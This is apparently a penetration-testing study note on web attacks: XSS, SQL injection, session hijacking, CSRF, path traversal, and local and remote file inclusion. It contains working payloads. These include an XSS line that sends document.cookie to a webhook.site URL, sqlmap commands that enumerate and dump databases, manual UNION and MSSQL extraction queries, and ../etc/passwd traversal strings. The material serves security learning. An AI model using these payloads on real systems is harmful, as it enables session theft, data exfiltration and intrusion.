# Web Attacks
- [Input Validation Attacks](#input-validation-attacks)
  * [Cross-Site Scripting (XSS)](#cross-site-scripting--xss-)
    + [Types of XSS](#types-of-xss)
    + [Goal of XSS](#goal-of-xss)
    + [Flow fo XSS Attack](#flow-fo-xss-attack)
    + [Finding XSS](#finding-xss)
    + [Testing and Exploiting XSS](#testing-and-exploiting-xss)
      - [Common Test](#common-test)
      - [Common Exploit](#common-exploit)
      - [Reflected XSS](#reflected-xss)
      - [Stored XSS](#stored-xss)
      - [DOM XSS](#dom-xss)
        * [Redirection](#redirection)
    + [BeEF-XSS](#beef-xss)
  * [SQL Injections (SQLi)](#sql-injections--sqli-)
    + [Types of SQLi](#types-of-sqli)
      - [In-Band SQLi](#in-band-sqli)
      - [Error-based SQLi](#error-based-sqli)
      - [Blind SQLi](#blind-sqli)
    + [Finding SQLi](#finding-sqli)
    + [Exploiting SQLi](#exploiting-sqli)
    + [Automated SQli](#automated-sqli)
      - [SQLMap](#sqlmap)
      - [Fine tuning SQLMap](#fine-tuning-sqlmap)
    + [Manual SQLi](#manual-sqli)
- [Session & Logic Attacks](#session-and-logic-attacks)
  * [Session Hijacking & Fixation](#session-hijacking-and-fixation)
  * [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery)
  * [Files and Resources Vulnerabilities](#files-and-resources-vulnerabilities)
# Input Validation Attacks
* attack triggered by user input, where input subverts the anticipated function of an application because of insufficient validation on client or server side.

## Cross-Site Scripting (XSS)
* where malicious scripts are injected browser side into otherwise benign and trusted websites.

### Types of XSS
1. Reflected XSS
   * [Reflected XSS](https://owasp.org/www-community/attacks/xss/) are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.
2. Stored XSS
   * [Stored attacks](https://owasp.org/www-community/attacks/xss/) are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. 
3. DOM XSS
   * [DOM XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS) is where attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. Thus the page itself does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

### Goal of XSS
* Goal of XSS is the same regardless of the type of XSS: 
   1. Cookie Stealing
   2. Getting Complete Control over a Browser
   3. Initiating Exploitation Phasse against Browser Plugins which will Lateral Move to the Machine
   4. Keylogging
* The only difference is how the payload arrives at the server.

### Flow fo XSS Attack
Identify Input Vectors ---> Analyse Insertion Point ---> Check for Filters ---> Exploit 

### Finding XSS
* Review the source of the website
* Search for all places where input from an HTTP request could possibly make its way into the HTML output.
* XSS are usually found on forms and fields in the website which does not have any sanitisation checks.

### Testing and Exploiting XSS
The tests and exploits for XSS are mostly similar. 
#### Common Test
```
(1)
This test script tries to load a bogus img and on error creates an alert box
<img src='aaa' onerror="alert(document.domain);" />

(2) 
This test script builds an svg element which is an alert box
<svg/onload="alert(document.domain)">
```
#### Common Exploit
This leverages webhook.site to steal cookies rather than having our own server.
```
(1)
<img src=" https://webhook.site/11f46906-4e5f-4d08-ae69-9caf44c7e2b7?document.cookie"/>
```
#### Reflected XSS
1. Identifying Reflected XSS
   * Where input is within the html code of the response

#### Stored XSS
1. Identifying Possible Stored XSS
   * Where there is a database to store inputs and displays as output.

#### DOM XSS
* Identifying Possible DOM XSS
   * By inspecting the source using the browser, if input is rendered(printed) on the page but absent in the html source
   * We can infer that input is rendered by the DOM API.
   * Look out for javascript that handles input client side
   * Example : 
   ```
   window.onload = function() {
				var site=document.location.href;
				var index = site.indexOf("=", 0);
				name="";
				if(index != -1) {
					name=site.substr(index+1);
				}
				name=decodeURIComponent(name);
				document.getElementById('name').innerHTML=name;
			} 
   ```
   * From the above javascript, we can see that DOM API `document.location.href` and `document.getElementByID` is used.  
   * The flow of the program is as such, 
      1. when windows is loaded function will be executed. 
      2. Variable `site` is the URL string in URl format of the current page, `index` is index of value where '=' is at and `name` is an empty variable
      3. As long as index is a positive number, variable `name` will be populated with string after '=' 
      4. name is then decoded to strings from its URL format 
      5. variable `name` is printed on to the HTML page with the element name of '*name*'  
   * As can be seen in the flow of program above, DOM
   * References : https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model

* Exploit
##### Redirection
   * Browser ---> Developer ---> Console
   * In console, we want to try to modify the form action.
```
clear() // clear the console
document.forms // command to list out all forms on the page and locate the targeted form.
document.forms[x].action="//example.com" // x is the index of the targeted form and example.com will be the redirection site
```
### BeEF-XSS 
- Browser Exploitation Framework project.
- Tool that can be used as a hook for XSS exploitation.

## SQL Injections (SQLi)
* a type of input validation attack in which SQL commands are injected from the data-plane input in order to affect the execution of predefined SQL commands and access or manupulate the web application's backend database.

### Types of SQLi
#### In-Band SQLi
* occurs when an attacker is able to use the same communication channel to both launch the attack and gather the results.  

#### Error-based SQLi
* is a type of in-band SQLi that relies on error messages thrown by the database to obtain information about the database.

#### Blind SQLi 
* that relies on sending an SQL query to the database which forces the application to return a visibly different result depending on whether the query returns a TRUE or FALSE result.
* [Boolean-Based Blind SQLi Script](https://github.com/irboi746/Tools/blob/main/Web/1.%20BlindSQLi.sh)
* Time-based Blind SQLi is a form of Boolean-based Blind SQLi, just that time is used to do the True/False inference. 
* Pseudo syntax used 
```
MSSQL
-----
IF (SELECT user) = 'sa' WAITFOR DELAY '0:0:5'
# if user = sa, delay 5 seconds. IF user is not sa, there will be no delay.
MySQL 
----
IF EXIST (SELECT * FROM users WHERE username = 'aa') BENCHMARK(1000000,MD5(1)) 
# if username = aa, do 1000000 MD5(1) calculation, which takes time thus causing delay. 
```  

### Finding SQLi
* Probe all inputs with characters that are known to cause SQL query to be syntatically invalid and forces the web application to return an error.
* These inputs can be GET and POST Requests, HEADERS and COOKIES. \
![SQL_Web_2](https://user-images.githubusercontent.com/88809233/145676430-e695b838-925a-46d8-996c-0abcffa4370b.PNG) 
* As can be seen above, user input required above is 'id' from GET request which can be dangerous when a malicious actor use some operators to make the database query things he wants. 
* Example : 
   * with the addition of `' or 'a'='a` it will turn the original query above to become \
   * `SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a'` \
   * The above statement tells the database to select the items by checking either of the two conditions when `id` is `null` or `'a' ='a'` an always true condition. This will thus tell the database to select all the items in the `Products` table.

### Exploiting SQLi
* In SQL injection, it is important to 'formulate' a SQL statement of the targeted SQLi query.
* Hence the understanding of Basic SQL SELECT Statement `SELECT <column list> FROM <table> WHERE <condition>` is very important.

### Automated SQli
#### SQLMap
* Basic Syntax
   ```
   GET Request 
   -----------
   sqlmap -u <URL> -p <injection param> [options]
   example :
   sqlmap -u www.example.com/aa.php?id=1' -p id --technique=U
   # this tells sqlmap to test the id parameter of the GET request and use UNION based injection technique 	
   
   POST Request
   ------------
   sqlmap -u <URL> --data=<POST string> -p <param> [options]
   
   ```
* Using Burp Suite with SQLMap extension
   * [BurpSuite Extension](https://portswigger.net/support/using-burp-with-sqlmap)
   * [Install Extension on Burp](https://portswigger.net/support/how-to-install-an-extension-in-burp-suite)
   * [Install Jython Dependencies](https://burpsuite.guide/runtimes/python/)

* Burp Suite and SQLMap separately
   * copy burp request as file   
   ```
   sqlmap -r <request file saved> -p <injection param> [options]
   ```

SQLMap Methodology
1. Extracting Banner of DB
   * Banner grabbing is used to test injection as well as proof the exploitability of the vulnerability.
2. List users of DB
3. Check if web application database user is a database admin
4. List available DB
5. List all tables in DB
6. List columns in table
7. Dump data

[SQL Commands References](https://github.com/sqlmapproject/sqlmap/wiki/Usage) \
Banner Grabbing
```
sqlmap -u <target> --banner <other options>
```

List Users
```
sqlmap -u <target> --users <other options>
```

Checking for DB admin
```
sqlmap -u <target> --is-dba <other options>
```

List all available databases
```
sqlmap -u <target> --dbs <other options>
```

List All Tables
```
sqlmap -u <target> -D <database name> --tables <other options>
```

List Columns 
```
1 table : sqlmap -u <target> -D <database name> -T <table name> --columns <other options>
multiple tables : sqlmap -u <target> -D <database name> -T <table name1, table name2,...> --columns <other options>
```

Dump Data
```
sqlmap -u <target> -D <database name> -T <table name> --C<column list> --dump <other options>
```
#### Fine tuning SQLMap
If DBMS Is Known
```
sqlmap --dbmd=<DBMS> 
```
Blind SQLi
* **--string** : a string which is always present in true output pages
* **--not-string** : a string which is present in false output pages
```
sqlmap -u <URL> --string "<string>"
```
Testing other headers
```
sqlmap -u <URL> --level N

Cookie Header --level 2
User-Agent and Referrer -- level 3
Host -- Level 5
```
Persistent Connection
```
sqlmap -u <URL> --keep-alive
```
Threading
```
sqlmap -u <URL> --threads 7
# 1 - 10 
```
### Manual SQLi
1. Enumerate the number of fields in a Query
   ```
   <valid input> UNION SELECT NULL; -- -
   <valid input> UNION SELECT NULL, NULL; -- -
   <valid input> UNION SELECT NULL, NULL, NULL; -- -
   ... ...
   ```
   * from the above the application is forced to execute the query `SELECT <column1>, <column2> FROM <table> WHERE <column1>=<valid input> UNION SELECT NULL; -- -`
   * This will trigger an error as the query on the left selects two fields while the query on the right select only one field. Hence `SELECT <column1>, <column2> FROM <table> WHERE <column1>=<valid input> UNION SELECT NULL, NULL; -- -` will work without triggering an error.

2. Identifying Field Types
* Most DB<S perform type enforcing i.e integer, strings, char etc.
* Hence in a Table that holds **int** type, when `SELECT 1 UNION 'a';` is run, an error will be triggered.
* Hence we will make use of the command above, and substitute the first null with a constant.
   * If the type used is correct, query will work
   * If the type used is incorrect, an error will be triggered. 
   ```
   <valid input> UNION SELECT 1, NULL, NULL; -- -
   # no error
   <valid input> UNION SELECT 1, 1, NULL; -- -
   # error
   <valid input> UNION SELECT 1, 'a', NULL; -- -
   # no error
   ... ...
   ```
3. Dumping the Database Content
   * A common trick will be to trigger a type conversion error. 
   * Refer to [Pentest Monkey Cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) for other databases.
   * Technique for MSSQL
   ```
   <invalid input> OR <valid input> IN (SELECT TOP 1 CAST <sql_function> as varchar(4096))-- 
   ```
    * Relevant Information to Dump : 
     1. Database Version 
        * replace `<sql_function>` with `@@version`
     2. Database username
        * replace `<sql_function>` with `user_name()`
     3. Database name
        * replace `<sql_function>` with `db_name()`
     4. Installed databases
        * replace `<sql_function>` with `db_name(N)`
        * where `N=0,1,2,3, ...`
        * can only see database which the current privilege can access
     5. Tables in a given database
     ```
     <invalid input> OR <valid input> IN 
     (SELECT TOP 1 CAST <sql_function> as varchar(4096)) FROM 
     <database name>..sysobjects WHERE 
     xtype = ‘U’ AND 
     name NOT IN 
     <known table list> 
     
     example : 
     Enum 1
     9999 or 1 IN (SELECT TOP 1 CAST name as varchar(4096)) FROM 
     Products..sysobjects WHERE 
     xtype='U' AND 
     name NOT IN (Baby)
     
     Enum 2
     9999 or 1 in (SELECT TOP 1 CAST name as varchar(4096)) FROM 
     Products..sysobjects WHERE 
     xtype='U' AND name NOT IN 
     (Apparels, Food ... ...)
     ```
     7. Columns names
     ```
     <invalid input> OR <valid input> in (SELECT TOP 1 CAST (<db name>..syscolumns.name as varchar(4096)) FROM    
     <db name>..syscolumns, <db name>..sysobjects WHERE 
     <db name>..syscolumns.id=<db name>..sysobjects.id AND 
     <db name>..sysobjects.name=<table name> NOT IN
     (<Known Column List>)
     
     <db name> name of database we are working on
     <table name> table that we are working on
     <know column list> list of columns already retrieved
     ```
     8. Database data 
    ```
    <invalid input> OR <valid input> in (SELECT TOP 1 CAST (<column name> as varchar(4096)) FROM
    <db name>..<table name> WHERE
    <column name> NOT IN
    (<retrieved data list>); --
    ```
   
# Session and Logic Attacks
## Session Hijacking and Fixation
* HTTP is a stateless protocol, hence to keep track of user session, web app uses cookies, libraries etc. 
* Session Hijacking refers to the exploitation of valid session assigned to user by stealing a valid session ID.
* Session Hijacking can be done in 2 ways : 
   1. Session Hijacking via XSS Cookie Stealing
   2. Session Hijacking via Packet Sniffing (Wireshark) 

* Session Fixation is a form of session hijacking where the attacker fixates a sessionID and forces the victim to use it.
   * The attacker creates a valid session ID and forces the victim to use it.
   * Criteria for Session Fixation Attack to occur : 
      1. sessionID does not refresh after user login
      2. Session ID is sent though URL instead of cookies.   

## Cross-Site Request Forgery
* A vulnerability where a third-party web application is able to perform an action on the user's behalf.
* It makes use of the function where we applications can sens request to other web applications without showing the response.
* something that automated scanning tool cannot find.
* Example : 
   * Victim visits `example.com`, logs in and leaves the site without logging out
   * Victim then visits a malicious site `malicious.com` which executes a REQUEST to `example.com` from Victim's browser by sending a RESPONSE that executes a REQUEST like this `<html><body><img src='http://www.example.com/aa'></html></body>`

## Files and Resources Vulnerabilities
1. Path Traversal
   * Some web application access resources on web server via parameters on the URL.
   * If these are not properly controlled and sanitized, there might be a possible path traversal vulnerability
      * An example of path in parameter is as such `www.example.com/getfile.php?path=abc123.pdf`
      * if parameter is not sanitized, an attacker can manipulate access to content of arbitrary files using the dot-dot-slash`../` attack.
      * by using `../` it may be possible to access directories that are hierarchically higher than the one from which we are picking from.
      * Hence, `www.example.com/getfile.php?path=../../../etc/passwd` or `www.example.com/getfile.php?path=/etc/passwd` can be used to reach /etc/passwd file in a linux/unix system.
      * Sometimes, a %00 (null byte) can be used to terminate the string and read other file extensions. (does not work for php 5.3.4 onward)
      * Take note of encoding if encoding is used.
2. Local File Inclusion attacks
   *  Local File Inclusion(LFI)found in scripts where path characters are not stripped from input and the input is used as part of an `include`.
   * Example : 
      * URL : `www.example.com/index.php?example=AA` 
      * PHP handler for URL :  
      ```
      <?php 
      include("loc/" . $_GET['location']) 
      >
      ```
      * From the above we can see that it is possible to conduct a dot-dot-dash attack bys sending  `../../../etc/passwd` in the URL and the PHP code will go up three directories and return /etc/passwd.
3. Remote File Inclusion attacks
   * Remote File Inclustion (RFI) works the same way as LFI but the aim is not just to read but to also to execute code remotely.
   * RFI requires that a shell is uploaded on another server and accessible over the internet or network.
   * To test for vulnerability, a sample injection of http://www.google.com can be injected as such `www.example.com/vuln.php?page=http://www.google.com`
   * HTML code of google.com should be injected if webpage is vulnerable.
   * 
4. Unrestricted File Upload
   * affects all web applications that allow file upload that does not enforce restrictive polices like maximum file size, type of file etc.
   * Impact of this vulnerability depends on how the file is used by the web application. 
   * Checklist for application to be vulnerable : 
      1. filetype is not checked against a whitelist of allowed format
      2. filename and path of uploaded file is known to the attacker or is guessable
      3. folder in which file is placed allows the execution of server side scripts.
